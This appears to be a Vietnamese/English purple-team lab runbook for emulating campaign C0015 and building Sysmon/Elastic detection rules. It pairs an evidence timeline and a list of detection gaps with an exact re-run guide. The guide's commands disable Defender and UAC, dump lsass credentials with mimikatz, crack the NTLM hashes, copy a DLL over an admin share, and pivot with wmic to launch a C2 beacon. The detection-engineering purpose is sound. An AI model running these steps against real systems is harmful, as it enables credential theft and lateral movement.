# Operator phase (S4–S9) — context, evidence, gaps, and exact run guide

Run: **RUN-20260930-01**. Machines: WS01 192.168.50.20 (duc.user; it.admin local admin sau setup),
FS01 192.168.50.30 (it.admin local admin; WMI firewall open; C:\C0015 ACL Everyone:F),
C2 host 192.168.50.1 (beacon/C2-SIM v3.2, Elastic 100.77.46.126:9200), DC01.
Elastic = Sysmon only (Security chưa ingest).

## 1. Context giai đoạn operator (S4–S9)

Camp gốc: operator từ runbook → discovery → thử/hiệu chỉnh credential → **WMI(process call create) với explicit
credential → rundll32 → 143.dll** → session-2 (FS01) → thu thập. Lab tái hiện cùng thứ tự; telemetry chi tiết ở
`docs/telemetry-comparison-c0015-vs-lab.md`.

## 2. Evidence máy + khung giờ đã chạy (2026-10-01, Z)

| khi | Máy | Stage | Evidence (record id / nguồn) |
|---|---|---|---|
| 02:04:53 | WS01 | S1 | E1 `mshta bootstrap.hta` r=338620 → `regsvr32 /s c0015-comparefor.jpg` r=338630 → `powershell c0015_beacon.ps1` (par ent khớp); markers b64-js-comparefor-dll |
| 02:05:08–46 | WS01 | S2–S4 | E1 con beacon (batch 8 discovery) + E3 ws01→:8080 + register phase3 `S1-799c8731a354c9ad` |
| 02:34:31–35 | WS01 | S5 | E1 `net view \\FS01` + `Get-SmbShare` (par=beacon) → Finance+IT; Get-SmbShare → ADMIN$/C$/IPC$ |
| 02:45:47–52 | WS01 | S7b | E1 `mimikatz.exe` pid=8096 (02:45:47, par=cmd/runas) + **E10 ProcessAccess lsass grant=0x1010** (02:45:52); E11 copy mimikatz → C:\Tools (sha 92804faa…) |
| 02:49:58–02:50:02 | FS01 | S8a | E11 3 file: `c0015_143_surrogate.dll`, `c0015_beacon.ps1`, `config-phase7.ini` → C:\C0015 (dir \\FS01\C$ confirm CPU) |
| 03:03:56–03:06:40 | FS01 | S8b(diag) | E1 `WmiPrvSE→cmd` pid 564 (whoami), 4520 (type), rundll32-alone pid 6940 (ReturnValue 0) |
| 03:04:11.793 | FS01 | S8b | **E7 ImageLoad `c0015_143_surrogate.dll` r=94752 — rundll32 pid=5872, sha `cbcd2a8b…` == ART-06-01** |
| 03:04:11.808/.816 | FS01 | S9 | E11 `c0015_143-executed.txt`; E1 beacon `powershell c0015_beacon.ps1` pid=6616 **par_ent ≡ rundll32 (E7) entity** |
| 03:04:13 | server | S9 | register `phase7-session2` `S1-0ec401bd7b91df2d` → **receipt ART-07-01-7b91df2d.json** |
| 03:04:15 | FS01 | S9 | E3 `192.168.50.30 → 192.168.50.1:8080` (pid 6616, lặp lại) |
| 03:11:36 | FS01 | S8b(loader) | E1 `WmiPrvSE→cmd→powershell s8b_loader.ps1` pid 964/2220 (WMI-side substitute) |
| 03:04:38 | server | — | C2-SIM dừng (log hết); restart 2026-10-02 01:09:25 (session mới) |

## 3. Những gì đã làm được (verified)
- Chuỗi **rundll32 → 143.dll → LabEntry → beacon → E3 → receipt** verified nguyên vẹn (hash parity + entity chain).
- **WMI process-creation (T1047)** verified (diag + loader, E1 parent WmiPrvSE).
- S7b **E10 lsass 0x1010 bởi mimikatz** verified + NTLM lấy được.
- C2-SIM v3.2: output `/results` `/last`, re-register (elevate handoff), loop vô hạn — operator remote đọc được output mọi lệnh.

## 4. GAPS — để tương lai chỉnh lại (ảnh hưởng rule)
| # | Gap | Hệ quả cho rule | Hướng chỉnh tương lai |
|---|---|---|---|
| G1 | **Security chưa ingest** (4624/4648/4672/5140/5145/4688) | Không có S4648/S4624/S4672 → auth-stage rules + join `LogonId` chết ở ES | Thêm data stream `.ds-logs-windows.security-*` (ingest policy); join LogonId trên S7/S8a |
| G2 | **`wmiprvse→rundll32` không tạo được** (rundll32+ANY-DLL qua WMI = ReturnValue 9, session-0/window-station) | Rule `parent=wmiprvse & child=rundll32` sẽ không fire | Rule theo hành vi: E7 ImageLoad DLL không ký + E3 C2-bấtthường, bất kể cha ∈ {wmiprvse, svchost, cmd, powershell} |
| G3 | S7b model binary: lab chạy `mimikatz.exe` (E1), gốc in-process | Rule theo tên process bỏ sót in-process | Rule key trên **E10 target=lsass, access có 0x1010/0x1fffff, nguồn KHÔNG-system**, loại trừ 0x1000/0x101000 (wininit/csrss/MsMpEng/svchost ambient) |
| G4 | E3 `:8000` (download stage) không thấy trong cửa sổ | Download-rule thiếu baseline | Rerun entry + capture E3 :8000 vào cửa sổ, re-baseline |
| G5 | Noise: 47k events/2.5h (ws01 E11 12.4k, E10 4.4k, DC01 E3 2.1k) | Count/threshold rules nhiễu | Rule gắn parent entity + timer, không dùng raw count |
| G6 | Beacon multi-register/dedup/re-register, loop vô hạn | Count lệnh inflate (cùng lệnh nhiều round) | Dedup bằng `process.entity_id`, giới hạn theo entity |
| G7 | S8b host loader thay rundll32 (WMI-side) | Rule rundll32-side không thấy phần WMI | Che cả 2: E1 cha-wmi + E7; hoặc dựng lại WMI→rundll32 khi có môi trường có interactive logon (chưa khả thi hiện tại) |
| G8 | C2-SIM chết 03:04:38 (không tự restart) | Gián đoạn session; evidence khe hở | launch_servers/guard: auto-restart + pid healthcheck |

## 4b. RERUN-V2 — KẾT QUẢ DIAG (2026-10-02, đã verify trên Elastic) → G1/G2/G4/G7/G8 RESOLVED

| Gap | Trạng thái | Bằng chứng / thay đổi |
|---|---|---|
| **G1** | ✅ **RESOLVED (là false-gap của verify script)** | Security events ĐÃ ingest, nhưng dưới dataset **`system.security`** (`.ds-logs-system.security-*`, 154k docs) chứ không phải `windows.security` — verify script + docs tra sai index. Trong cửa sổ run cũ 02:00–04:30Z 10-01: **4624=414, 4672=328, 4648=24, 4688=11, 4625=3**. `verify_run_evidence.py` đã sửa [9] sang system.security. (5140/5145 = 0 → audit policy chưa bật Detailed File Share, không phải ingest.) |
| **G2** | ✅ **SOLVED — root cause thật = wmic parse dấu phẩy + Defender signature** | (1) `wmic process call create "<cmd>"` tách tham số bằng **dấu phẩy**: `...143.dll,LabEntry` → CommandLine bị cắt → CreateProcess "path not found" = ReturnValue 9 (không liên quan window-station/session-0 — rundll32-alone trả 0 đã chứng minh rundll32 chạy được session-0). **Fix: space-form** `...143.dll LabEntry` → **ReturnValue 0** + rundll32 gọi đúng export. (2) FS01 bị revert snapshot → Defender RTM bật lại → signature **`Trojan:Win32/RyukLocalspawn.A`** chặn `wmic ... rundll32` → "Access is denied" (bắt đúng pattern Ryuk/Conti WMI-lateral!). **Verified trên Elastic 02:09:55Z: E1 `rundll32 pid=5220 parent=WmiPrvSE.exe cmd=...143.dll LabEntry` + E7 hash `cbcd2a8b…`==ART-06-01 + E11 marker + beacon-3 phase7-session2 + receipt ART-07-01** → chữ ký camp `wmiprvse→rundll32→143.dll` tái hiện nguyên vẹn. |
| **G4** | ✅ **Đóng được** | E3 `:8000` giờ có sẵn (S8a tool fetch qua `Invoke-WebRequest`): verify [8] mới chạy được; window rerun sẽ capture. |
| **G7** | ✅ **RESOLVED (cùng G2)** | WMI-side giờ là rundll32 thật; `s8b_loader.ps1` còn làm fallback. |
| **G8** | ✅ **RESOLVED (commit e793d7e)** | `scripts/c2sim_guard.py` + `launch_servers.ps1`: auto-respawn + stderr capture (`c2sim.err.log`) + stop-flag; `-Stop` giết guard + child + http. |
| FS01 state | ⚠️ **đã revert snapshot** (RTM/ASR/exclusions mất) → re-preflight | `preflight_vmrun.ps1` + `defender_off.ps1` (chạy SYSTEM qua schtasks) đã bật lại: RTM off, ASR `d1e49aac` off, exclusions, WMI firewall (WS01 mở mới cho operator hop), EnableLUA=0 (WS01), Trust Center Word (VBAWarnings/AccessVBOM/ProtectedView off). |

**Rule-writing cập nhật theo kết quả v2:**
- S8b: rule `E1 parent=wmiprvse & child=rundll32 + E7 unsigned-DLL + E3 :8080` **sống lại** (đúng camp); giữ behavior-rule fallback cho loader-host (G7 cũ).
- S7b: rule E10 lsass (0x1010/0x1fffff, non-system) — nguồn có thể là chain wmiprvse→powershell→mimikatz hoặc beacon-elevated.
- S7/S8a: join LogonId giờ khả thi — dùng `winlog.logon.id` (4648.SubjectLogonId ↔ 4624.TargetLogonId / TargetLogonGuid).

## 5. Hướng dẫn chạy lại từ đầu → cuối (CHÍNH XÁC — bản verified)
> Lệnh "chuẩn" đã được chứng minh ra đúng evidence. Mỗi mục ghi máy + nơi lấy evidence.

**P0 — Build/preflight (1 lần/máy)**
- Kali: build `143.dll` + download mimikatz + `john` (hashcat thiếu OpenCL).
- WS01+FS01+C2: tắt Tamper Protection → `Set-MpPreference -AttackSurfaceReductionRules_Ids d1e49aac-8f56-4280-b9aa-9936ba642ffc -AttackSurfaceReductionRules_Actions Disabled`; `-DisableRealtimeMonitoring $true`; exclusions (pwsh/powershell/cmd/wmic/rundll32/mimikatz + C:\C0015,C:\stage,C:\Tools,C:\Users\Public\C0015,C:\ProgramData\C0015,E:\lab).
- WS01: `net localgroup Administrators C0015\it.admin /add`; `reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f` + **reboot**.
- FS01: `net localgroup Administrators C0015\it.admin /add`; **mở WMI firewall**: `Set-NetFirewallRule -DisplayGroup "Windows Management Instrumentation (WMI)" -Enabled True`; `icacls C:\C0015 /grant Everyone:F /T`.
- C2: repo clean, Elastic đã lấy.

**P1 — Entry + beacon-1 (S1–S3)**
1. [C2] `pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -RunId RUN-<id> -Action Pre` (servers UP, chờ LISTENER OK 2 port).
2. [WS01] `runas /user:C0015\it.admin "cmd /c ping -t 127.0.0.1"` (S0 seed, giữ cửa sổ) → stage (`stage_ws01.ps1 -Source C:\stage`) → mở `test.docm` (Enable Content).
3. [C2] `-Action WaitSession` (lấy token `S1-…`) → `-Action P1`.

**P2 — Operator (S4–S9)** (beacon-1 alive)
1. [C2] `-Action P2` (runbook discovery+share; đọc output `-Action Results`). Evidence E1 mỗi lệnh 02:05–02:34 — WS01.
2. [C2→WS01] `-Action Run -Body 'net view \\FS01'` + `-Body 'powershell -NoProfile -Command Get-SmbShare'` (S5).
3. [WS01] elevate beacon: `runas /user:C0015\it.admin "cmd /k powershell … c0015_beacon.ps1 -Config C:\Users\Public\C0015\config.ini"` (token tự adopt; queue giữ).
4. [WS01] S7b: elevated console `C:\Tools\mimikatz.exe` → `privilege::debug` → `sekurlsa::logonpasswords` → NTLM; [Kali] `john --format=nt` (rockyou fail → plaintext provisioned). Evidence E10 ws01 02:45 — **E10 lsass 0x1010**.
5. [C2] S8a: `-Action Run -Body 'cmd /c copy /Y C:\stage\c0015_143_surrogate.dll \\FS01\C$\C0015\'` (+ beacon, config-phase7). Evidence **FS01 E11 02:49–50**.
6. [C2] S8b: WMI pivot — **dùng console-loader** (rundll32-DLL qua WMI chặn): tạo `C:\C0015\s8b_loader.ps1` (LoadLibrary+LabEntry của 143.dll) trên FS01, rồi `wmic /node:FS01 process call create "cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -File C:\C0015\s8b_loader.ps1"` → ReturnValue 0. Evidence **FS01 E1 WmiPrvSE→cmd→powershell**.
   (Ưu tiên telemetry gốc: rundll32 → 143.dll khi có console FS01 interactive — E7 r=94752 như đã verify.)
7. [C2] `-Action WaitSession`/check receipt: `Get-ChildItem evidence\run-ledger` → **ART-07-01-<token>.json** (S9). Evidence **FS01 E3 →:8080** + E11 marker + receipt.

**Q — Verify + cleanup**
- Elastic: chạy `stage/analysis/verify_run_evidence.py` (env ES creds) → hash parity + entity chain; `run-window-evidence.md`.
- `git pull/commit` evidence; cleanup: đóng runas beacon, `-Action Stop`, bật lại ASR/RTM/firewall, xoá C:\C0015/artifacts.

## 6. Rule-writing pointers (kèm gap)
- **Chuẩn B-A-S-E**: rule cho S8b = E7 ImageLoad DLL không ký + E3 C2-port-lạ (G2); S7b = E10 lsass access non-system (G3); S4 = E1 con beacon (anchor entity, G6); S7/S8a auth = chỉ làm được khi ingest Security (G1).
- Mỗi rule note kèm gap G# để tương lai chỉnh.